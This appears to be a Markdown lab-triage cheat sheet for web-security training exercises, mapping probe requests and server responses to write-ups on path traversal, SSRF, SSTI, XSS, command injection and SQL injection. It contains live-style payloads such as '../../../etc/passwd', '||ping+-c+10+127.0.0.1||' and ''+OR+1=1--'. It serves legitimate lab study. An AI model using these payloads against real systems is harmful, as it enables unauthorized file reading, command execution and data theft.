#### Check stock ❌
- `GET /image?filename=../../../etc/passwd`
	- 200 OK
		- [LFI](LFI.md#3.1.%20Lab%20File%20path%20traversal%2C%20simple%20case%20%E2%AD%95%EF%B8%8F)
	- "No such file"
		- [LFI](LFI.md#3.2.%20Lab%20File%20path%20traversal%2C%20traversal%20sequences%20blocked%20with%20absolute%20path%20bypass%20%E2%AD%95%EF%B8%8F)
		- [LFI](LFI.md#3.3.%20Lab%20File%20path%20traversal%2C%20traversal%20sequences%20stripped%20non-recursively%20%E2%AD%95%EF%B8%8F)
		- [LFI](LFI.md#3.4.%20Lab%20File%20path%20traversal%2C%20traversal%20sequences%20stripped%20with%20superfluous%20URL-decode%20%E2%AD%95%EF%B8%8F)
		- [LFI](LFI.md#3.6.%20Lab%20File%20path%20traversal%2C%20validation%20of%20file%20extension%20with%20null%20byte%20bypass%20%E2%AD%95%EF%B8%8F)
	- "Missing parameter 'filename'"
		- [LFI](LFI.md#3.5.%20Lab%20File%20path%20traversal%2C%20validation%20of%20start%20of%20path%20%E2%AD%95%EF%B8%8F)
- `GET /product?productId=1` set `Referer` to Burp Collaborator
	- [SSRF](SSRF.md#3.3.%20Lab%20Blind%20SSRF%20with%20out-of-band%20detection%20%E2%AD%95%EF%B8%8F)
- `GET /?message=Unfortunately...`  after clicking on View details
	- `<%25%3d+7*7+%25>`
		- 49 in response
			- [SSTI](SSTI.md#3.1.%20Lab%20Basic%20server-side%20template%20injection%20%E2%AD%95%EF%B8%8F)
		- `7*7` in response
			- [SSTI](SSTI.md#3.4.%20Lab%20Server-side%20template%20injection%20in%20an%20unknown%20language%20with%20a%20documented%20exploit%20%E2%AD%95%EF%B8%8F)
- `GET /product?productId=a`
	- Apache Struts 2 2.3.31
		- [Content Discovery](Content%20Discovery.md#1.1%20Lab%20Information%20disclosure%20in%20error%20messages%20%E2%AD%95%EF%B8%8F)

##### Comment in Page Source
- `phpinfo.php`
	- [Content Discovery](Content%20Discovery.md#1.2.%20Lab%20Information%20disclosure%20on%20debug%20page%20%E2%AD%95%EF%B8%8F)
- `addEventListener`
	- `JSON.parse(e.data)` 
		- [DOM-Based XSS](DOM-Based%20XSS.md#1.3.%20Lab%20DOM%20XSS%20using%20web%20messages%20and%20%60JSON.parse%60%20%E2%AD%95%EF%B8%8F)
	- `getElementById()`
		- [DOM-Based XSS](DOM-Based%20XSS.md#1.1.%20Lab%20DOM%20XSS%20using%20web%20messages%20%E2%AD%95%EF%B8%8F)

##### Target > Engagement tools > Search
- `lastViewedProduct`
	- [DOM-Based XSS](DOM-Based%20XSS.md#1.5.%20Lab%20DOM-based%20cookie%20manipulation%20%E2%AD%95%EF%B8%8F)


##### `/robots.txt`
- `/backup`
	- [Content Discovery](Content%20Discovery.md#1.3.%20Lab%20Source%20code%20disclosure%20via%20backup%20files%20%E2%AD%95%EF%B8%8F)
	- 

##### Submit Feedback
- `||ping+-c+10+127.0.0.1||` 
	- takes ~10secs from response
		- [OS Command Injection](OS%20Command%20Injection.md#3.2.%20Lab%20Blind%20OS%20command%20injection%20with%20time%20delays%20%E2%AD%95%EF%B8%8F)
		- [OS Command Injection](OS%20Command%20Injection.md#3.3.%20Lab%20Blind%20OS%20command%20injection%20with%20output%20redirection%20%E2%AD%95%EF%B8%8F)
	- immediate response
		- [OS Command Injection](OS%20Command%20Injection.md#3.4.%20Lab%20Blind%20OS%20command%20injection%20with%20out-of-band%20interaction%20%E2%AD%95%EF%B8%8F)
		- [OS Command Injection](OS%20Command%20Injection.md#3.5.%20Lab%20Blind%20OS%20command%20injection%20with%20out-of-band%20data%20exfiltration%20%E2%AD%95%EF%B8%8F)

##### Filter Categories
- `'+order+by+1--`
	- 200 OK
		- <sup>Solve: '+OR+1=1--</sup> [SQLi](SQLi.md#2.1.%20Lab%20SQL%20injection%20vulnerability%20in%20WHERE%20clause%20allowing%20retrieval%20of%20hidden%20data%20%E2%AD%95%EF%B8%8F)
	- 500 Internal Server Error
		- JavaScript syntax error `JSInterpreterFailure`
			- [NoSQL injection](NoSQL%20injection.md#1%2F2.1.%20Lab%20Detecting%20NoSQL%20injection%20%E2%AD%95%EF%B8%8F)

##### Filter Categories (No Products) <sup>Only show 2 rows of text per entry</sup>
- `'+order+by+1--`
	- 200 OK
		- `'+UNION+SELECT+'abc','def'+FROM+dual--` == 200 OK
			- [SQLi](SQLi.md#2.3.%20Lab%20SQL%20injection%20attack%2C%20querying%20the%20database%20type%20and%20version%20on%20Oracle%20%E2%AD%95%EF%B8%8F) 
	- 500 Internal Server Error
		- `'+order+by+1#` == 200 OK
			- [SQLi](SQLi.md#2.4.%20Lab%20SQL%20injection%20attack%2C%20querying%20the%20database%20type%20and%20version%20on%20MySQL%20and%20Microsoft%20%E2%AD%95%EF%B8%8F)


